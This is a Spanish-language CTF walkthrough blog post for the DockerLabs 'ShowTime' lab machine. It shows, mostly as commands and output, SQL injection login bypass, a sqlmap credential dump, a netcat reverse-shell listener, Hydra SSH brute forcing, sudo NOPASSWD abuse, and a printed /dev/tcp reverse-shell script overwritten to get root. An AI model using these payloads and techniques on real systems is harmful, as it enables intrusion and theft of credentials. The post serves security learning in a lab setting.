---
title : "ShowTime CTF Walkthrough"
date: 2024-08-29 01:32:12 +0200
categories: [CTF Walkthrough]
tags: [CTF,Walkthrough, DockerLabs, Rustscan, Feroxbuster, SQL Injection, Burp Suite, SQLMap, Hydra, Sudo -l, NOPASSWD]
---

![ShowTime](/assets/post_img/ShowTime/logo%20(1).png) 

Hoy nos encontramos con una máquina interesante ya que toca SQL Injection, así que veamos como se resuelve.


Comenzamos esta CTF creada por maciiii___ con la metodología ya vista en anteriores Write-ups, usando [Rustscan](https://github.com/RustScan/RustScan) como herramienta de escaneo de puertos.
```bash
┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/deploy]
└─$ rustscan -a 172.17.0.3 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I don't always scan ports, but when I do, I prefer RustScan.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.17.0.3:22
Open 172.17.0.3:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sCV" on ip 172.17.0.3

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:9a:9f:b3:17:be:3d:2e:12:05:0f:a4:61:c3:b3:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGVopaCeVDexTXjTQ8Evp32rYr6xz/SRwxkF38MuCV3M2r+qNEQeVQmIOoln+Ost9TBwT0IOTCB0UnahMdphYaA=
|   256 69:8f:5c:4f:14:b0:4d:b6:b7:59:34:4d:b9:03:40:75 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF8UKDJcTeQYC0J6ABwec15ZJeGiC1YQ8BiHp19ErpLP
80/tcp open  http    syn-ack Apache httpd 2.4.58 ((Ubuntu))
|_http-title: cs
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Del resultado podemos ver que los puertos SSH y HTTP están abiertos, así como de costumbre observaremos la web que corre por el puerto 80. Sobre las versiones no vemos ninguna que sea conocidamente vulnerable y sobre el sistema operativo vemos que es Ubuntu.

Seguimos con el segundo paso que es el _Fuzzing_ con [Feroxbuster](https://github.com/epi052/feroxbuster/releases), donde el resultado nos muestra varios archivos y directorios, pero en el siguiente estracto destaco los resultados que considero importantes:

```bash
┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/deploy]
└─$ feroxbuster -u http://172.17.0.3:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 0 -t 100 -x html,txt,php,py
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.3:80
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt, php, py]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ INFINITE
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://172.17.0.3/login_page/home.php => index.php
200      GET        1l        5w       37c http://172.17.0.3/login_page/auth.php
200      GET       73l      150w     2025c http://172.17.0.3/login_page/
301      GET        9l       28w      313c http://172.17.0.3/login_page => http://172.17.0.3/login_page/
```
Vemos un directorio llamado **/login_page** que alberga tres archivos llamados **home.php, index.php** y **auth.php**.


Observando la página en nuestro navegador vemos un sencillo login donde se me ocurrió hacer una SQL Injection con una operación lógica bastante conocida: `'OR 1=1 --`. 

![Login](/assets/post_img/ShowTime/1-LOGIN.png)

El login es correcto pero no nos da ninguna opción más. Con esto hemos comprobado que la página es vulnerable a SQL Injection, por eso usaremos la herramienta **SQLMap** para seguir adentrándonos.

![Succeed Login](/assets/post_img/ShowTime/2-AUTH.png)

El método que personalmente uso comienza capturando la petición HTTP con **BurpSuite** al iniciar sesión en el login. 

![Burp POST Request](/assets/post_img/ShowTime/3-POST-BURP.png)

Seguimos copiando la petición entera y la guardándola en un archivo de texto.
```bash
┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/content]
└─$ cat burp.txt             
POST /login_page/auth.php HTTP/1.1
Host: 172.17.0.3
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.17.0.3
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.17.0.3/login_page/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

usuario=%27OR+1%3D1+--&contrase%C3%B1a=%27OR+1%3D1+--
```

Y por último usando **SQLMap**, automatizaremos la explotación de SQL Injection con los siguientes parámetros:
- **-r burp.txt**: especificamos el archivo que alberga la petición que SQLMap usará para ejecutar sus injecciones.
- **-dbs**: sirve para enumerar las bases de datos encontradas.
- **--dump**: esta función muestra el vuelco de la información encontrada en las tablas.

```bash
┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/content]
└─$ sqlmap -r burp.txt -dbs --dump 
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.7#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:52:14 /2024-08-25/

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

Database: users
Table: usuarios
[3 entries]
+----+----------------------+----------+
| id | password             | username |
+----+----------------------+----------+
| 1  | 123321123321         | lucas    |
| 2  | 123456123456         | santiago |
| 3  | MiClaveEsInhackeable | joe      |
+----+----------------------+----------+

[*] ending @ 20:54:18 /2024-08-25/
```
El resultado del **--dump** nos muestra los campos **usuario** y **contraseña** con sus respectivos registros los cuales tendremos en cuenta como possibles credenciales válidas.

Las credenciales correctas son el usuario **joe** y la password **MiClaveEsInhackeable**. Una vez nos logueamos correctamente, tenemos un panel de administración el cual ejecuta comandos python. Sabiendo esto, ejecutaremos una Reverse Shell para ganar acceso remoto.

![Reverse Shell](/assets/post_img/ShowTime/4-PY-REVSH.png)

Desde Kali, recibimos la Reverse Shell obteniendo así el control del usuario **www-data**. Lo siguiente es retomar la metodología tratando la **TTY**:

```bash                                                                  
┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/deploy]
└─$ sudo nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.0.27] from (UNKNOWN) [172.17.0.3] 58018
$ whoami
whoami
www-data
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@eb67e53c9530:/var/www/html/login_page$ ^Z
zsh: suspended  sudo nc -lvnp 9001

┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/deploy]
└─$ stty raw -echo; fg
[1]  + continued  sudo nc -lvnp 9001
                                    reset
reset: unknown terminal type unknown
Terminal type? xterm
www-data@eb67e53c9530:/var/www/html/login_page$ export TERM=xterm
www-data@eb67e53c9530:/var/www/html/login_page$ export SHELL=bash
```

Buscando entre directorios, encontramos en /tmp un texto oculto interesante que contiene cadenas de texto separados en saltos de línea, recordandonos a un diccionario de contraseñas:
```bash
www-data@eb67e53c9530:/tmp$ ls -la
total 20
drwxrwxrwt 1 root     root     4096 Aug 25 22:09 .
drwxr-xr-x 1 root     root     4096 Aug 25 20:24 ..
-rw-r--r-- 1 root     root      894 Jul 22 23:24 .hidden_text.txt
-rw-r--r-- 1 www-data www-data  126 Aug 25 22:09 temp_script.py
drwx------ 2 mysql    mysql    4096 Jul 22 23:28 tmp.w3E3JvWoeD

www-data@eb67e53c9530:/tmp$ cat .hidden_text.txt 
Martin, esta es mi lista de mis trucos favoritos de gta sa:


HESOYAM
UZUMYMW
JUMPJET
LXGIWYL
KJKSZPJ
YECGAA
SZCMAWO
ROCKETMAN
AIWPRTON
OLDSPEEDDEMON
CPKTNWT
WORSHIPME
NATURALTALENT
BUFFMEUP
[...]
```
Teniendo en cuenta que la contraseña puede que sea en minúsculas, pasaremos de mayúsculas a minúsculas las posibles credenciales con la herramienta **tr**.
```bash
┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/content]
└─$ cat w.txt | tr 'A-Z' 'a-z' 
hesoyam
uzumymw
jumpjet
lxgiwyl
kjkszpj
yecgaa
szcmawo
rocketman
aiwprton
oldspeeddemon
cpktnwt
worshipme
naturaltalent
buffmeup
[...]
```
Ademas de las contraseñas, enumeramos los usuarios que se encuentran en el archivo **/etc/passwd**.
```bash
root@eb67e53c9530:/home/luciano# cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
joe:x:1001:1001:joe,,,:/home/joe:/bin/bash
luciano:x:1002:1002:luciano,,,:/home/luciano:/bin/bash
```

Al tener contraseñas y usuarios, usaremos **Hydra** para realizar un ataque de fuerza bruta offline, encontrando así las credenciales SSH del usuario **joe** con la contraseña **chittychittybangbang**.
```bash
┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/content]
└─$ hydra -l joe -P w.txt ssh://172.17.0.3 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-25 22:12:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 78 login tries (l:1/p:78), ~5 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: joe   password: chittychittybangbang
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-25 22:12:47
```
Y con las credenciales encontradas realizamos la intrusión correctamente via SSH. 
```bash
┌──(kali㉿kali)-[~/…/DockerLabs/Facil/9-ShowTime/content]
└─$ ssh joe@172.17.0.3                     
joe@172.17.0.3's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.6.9-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Aug 25 23:11:57 2024 from 172.17.0.1
joe@eb67e53c9530:~$ id
uid=1001(joe) gid=1001(joe) groups=1001(joe),100(users)
```
Una vez dentro continuamos con la metodología para la escalada de privilegios con `sudo -l`. El resultado nos muestra un binario que se puede ejecutar como root sin necesidad de contraseña para el usuario luciano.

Para abusar de esta vulnerabilidad, necesitamos ejecutar el comando como luciano con `sudo -u luciano`, y posteriormente indicando el binario:
```bash
joe@eb67e53c9530:~$ sudo -l
Matching Defaults entries for joe on eb67e53c9530:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joe may run the following commands on eb67e53c9530:
    (luciano) NOPASSWD: /bin/posh
joe@eb67e53c9530:~$ sudo -u luciano /bin/posh
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

Una vez dentro volvemos a ejecutar el comando `sudo -l` viendo así el binario **/bin/bash** y el script **/home/luciano/script.sh** como archivos configurados como **NOPASSWD**.

Buscamos el directorio y encontramos el script, donde vemos que el propietario es el mismo luciano, dándonos la posibilidad de cambiar el contenido y ejecutarlo como root.
```bash
luciano@e0633b1bd5ce:/home/joe$ sudo -l
Matching Defaults entries for Luciano on e0633b1bd5ce:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luciano may run the following commands on e0633b1bd5ce:
    (root) NOPASSWD: /bin/bash /home/luciano/script.sh

luciano@eb67e53c9530:/home/joe$ cd 
luciano@eb67e53c9530:~$ ls -la
total 32
drwxr-x--- 3 luciano luciano 4096 Jul 23 16:10 .
drwxr-xr-x 1 root    root    4096 Jul 23 16:02 ..
-rw-r--r-- 1 luciano luciano  220 Jul 23 16:02 .bash_logout
-rw-r--r-- 1 luciano luciano 3771 Jul 23 16:02 .bashrc
drwxrwxr-x 3 luciano luciano 4096 Jul 23 16:06 .local
-rw-r--r-- 1 luciano luciano  807 Jul 23 16:02 .profile
-rw-rw-r-- 1 luciano luciano  112 Jul 23 16:07 script.sh
```

Viendo el contenido del script no encontramos nada interesante, pero podemos cambiar su contenido al ser el propietario.
```bash
luciano@eb67e53c9530:~$ cat script.sh 
#!/bin/bash


IP="192.168.1.100"
PORT="4444"

bash -c 'exec 5<>/dev/tcp/'$IP'/'$PORT'; cat <&5 | bash >&5 2>&5'

luciano@eb67e53c9530:~$ nano script.sh 
bash: nano: command not found
luciano@eb67e53c9530:~$ vim script.sh 
bash: vim: command not found
luciano@eb67e53c9530:~$ vi script.sh 
bash: vi: command not found
```
Nos encontramos con el problema de que no se encuentra disponible un editor de texto en el sistema para cambiar su contenido. Una solución es usar **echo**, añadiendo el comando "**bash -p**" para ejecutar una shell con privilegios y obteniendo finalmente el acceso root.
```bash
luciano@eb67e53c9530:~$ echo "bash -p" > script.sh 
luciano@eb67e53c9530:~$ cat script.sh 
bash -p
luciano@eb67e53c9530:~$ sudo /bin/bash /home/luciano/script.sh
root@eb67e53c9530:/home/luciano# whoami
root
```

¡Espero que el _Walkthrough_ del dia de hoy os haya parecido interesante y que hayáis podido aprender o refrescar conceptos! Si tenéis alguna duda o recomendación podéis contactar conmigo, ¡un gran saludo a todos!

![ShowTime](/assets/post_img/ShowTime/5-ShowTime.png) 

Hasta la próxima,

~loh♡.